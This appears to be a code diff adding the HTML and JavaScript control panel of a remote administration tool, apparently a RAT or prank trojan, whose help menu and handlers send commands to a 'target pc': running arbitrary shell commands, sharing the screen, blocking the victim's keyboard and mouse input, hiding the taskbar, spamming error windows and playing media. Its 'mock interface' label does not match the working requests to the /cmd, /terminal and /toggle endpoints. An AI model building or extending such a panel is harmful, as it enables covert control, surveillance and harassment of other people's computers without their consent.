@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Terminal for {{user}} by ms32</title>
+    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
+    <style>
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    background-color:#181818;
+    color: rgba(85, 180, 85, 1);
+    font-family: 'VT323', monospace;
+    font-size: 20px;
+    line-height: 1.5;
+}
+
+.container {
+    display: flex;
+    flex-direction: column;
+    height: 100%;
+    overflow: hidden;
+}
+
+.header {
+    text-align: center;
+    padding: 10px;
+    border-bottom: 1px solid #33ff33;
+    text-transform: uppercase;
+    font-size: 20px;
+}
+
+.terminal {
+    flex-grow: 1;
+    padding: 10px;
+    overflow-y: auto;
+    color: rgba(85, 180, 85, 1);
+    font-family: 'VT323', monospace;
+    font-size: 20px;
+}
+
+.input-line {
+    display: flex;
+    font-size: 20px;
+    padding: 10px;
+}
+
+.input-line span {
+    margin-right: 5px;
+    font-size: 20px;
+    
+}
+
+input {
+    background: none;
+    border: none;
+    color: rgba(85, 180, 85, 1);
+    font-family: 'VT323', monospace;
+    flex: 1;
+    font-size: 22px;
+    outline: none;
+}
+
+input::placeholder {
+    color: rgba(85, 180, 85, 1);
+    font-family: 'VT323', monospace;
+    font-size:22px;
+}
+
+.output {
+    margin-bottom: 10px;
+    font-size: 22px;
+}
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header" id="title">Terminal for {{user}} by ms32</div>
+        <div id="terminal" class="terminal"></div>
+        <div class="input-line">
+            <span>&gt;&gt;</span>
+            <input id="cmdInput" type="text" placeholder="Type a command..." autofocus>
+        </div>
+    </div>
+
+    <script>
+        const terminal = document.getElementById('terminal');
+        const cmdInput = document.getElementById('cmdInput');
+
+        cmdInput.addEventListener('keypress', function (event) {
+            if (event.key === 'Enter') {
+                const command = cmdInput.value.trim();
+                if (command) {
+                    terminal.innerHTML += `<div class="output">&gt; ${command}</div>`;
+                    processCommand(command);
+                }
+                cmdInput.value = '';
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+        });
+        async function output(){
+          let retries = 5
+          while(retries >0){
+            const data = await fetch("/get-output",{
+              method:"GET"
+              })
+            const out = await data.text()
+            console.log(out)
+            if(data.status !== 202 && (out !== "try again")){
+              return out
+            }
+            retries -= 1
+        }}
+        async function processCommand(cmd) {
+            let response;
+            let data;
+            if (cmd.toLowerCase() === 'help') {
+                response = `
+                clear : To clear the terminal
+                status : To check current user's status
+                change-user : To change the user
+                speak : To speak in target pc
+                open : To open a url on target pc
+                lis-aud : To list all avaiable audios
+                lis-img : To list all avaiable images
+                lis-vid : To list all avaiable videos
+                aud : To play audio on target pc
+                img : To display an image on target pc
+                vid : To play a video on target pc
+                cmd : To run any command on target pc
+                hide on or off : To hide/show taskbar
+                spam on or off : To toggle spam mode
+                chaos on or off : To on/off chaos 
+                share on or off : To on/off screen share
+                block on or off : To enable/disable input on target pc
+                err : To open n number of errors on target pc
+                
+                `;
+            } else if (cmd.toLowerCase() === 'about') {
+                response = 'Remote Terminal by ms32. This is a mock interface.';
+            } else if (cmd.toLowerCase() === 'clear') {
+                terminal.innerHTML = '';
+                return;
+            }else if (cmd === "status"){
+              data = await fetch("/status",{method:"GET"})
+              response = await data.text()
+            }else if(cmd.startsWith("change-user")){
+              const user = cmd.replace("change-user ","")
+              document.getElementById("title").textContent = `Terminal for ${user} by ms32`
+              document.title = `Terminal for ${user} by ms32`
+              fetch("/change-user", {
+                method: "POST",
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ user: user })
+              });
+              response = `user changed to ${user}`
+            }else if(cmd.startsWith("speak") || cmd.startsWith("open") || cmd.startsWith("play") || cmd.startsWith("img")|| cmd.startsWith("vid") || cmd.startsWith("err")){                
+              fetch("/cmd",{
+                method:"POST",
+                body: cmd
+              })                
+              response = await output()
+            }else if(cmd === "lis-aud"){
+              response = "{{audios}}"
+            }else if (cmd === "lis-img") {
+              response = "{{images}}"
+            }else if (cmd === "lis-vid") {
+              response = "{{videos}}"
+            }else if (cmd.startsWith("hide")){
+              const state = cmd.replace("hide ","")
+              fetch("/toggle", {
+                method: "POST",
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cmd: "hIdE", state: state })
+              });
+              response = await output()
+            }else if (cmd.startsWith("spam")) {
+              const state = cmd.replace("spam ", "")
+              fetch("/toggle", {
+                method: "POST",
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cmd: "sPaM", state: state })
+              });
+              response = await output()
+            }else if (cmd.startsWith("chaos")) {
+              const state = cmd.replace("chaos ", "")
+              fetch("/toggle", {
+                method: "POST",
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cmd: "cHaOs", state: state })
+              });
+              response = await output()
+            }else if (cmd.startsWith("share")) {
+              const state = cmd.replace("share ", "")
+              fetch("/toggle", {
+                method: "POST",
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cmd: "sHaRe", state: state })
+              });
+              response = await output()
+            }else if (cmd.startsWith("block")) {
+              const state = cmd.replace("block ", "")
+              fetch("/toggle", {
+                method: "POST",
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cmd: "bLoCk", state: state })
+              });
+              response = await output()
+            }
+            else if(cmd.startsWith("cmd")){
+              cmd = cmd.replace("cmd ","")
+                fetch("/terminal", {
+                    method: "POST",
+                    headers: {
+                    'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({input: cmd})
+                });
+                
+                response = await output();
+
+            }else{
+              response = `invaild command : ${cmd}`
+            }
+
+            terminal.innerHTML += `<div class="output">>> ${response.replace(/\n/g, '<br>')}</div>`;
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+    </script>
+</body>
+</html>
